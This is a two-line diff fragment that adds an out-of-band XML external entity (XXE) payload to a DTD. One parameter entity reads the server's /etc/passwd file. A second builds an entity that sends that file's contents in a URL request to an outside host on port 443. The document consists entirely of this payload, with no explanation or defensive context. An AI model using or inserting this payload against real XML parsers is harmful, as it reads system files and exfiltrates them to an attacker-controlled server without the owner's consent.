@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
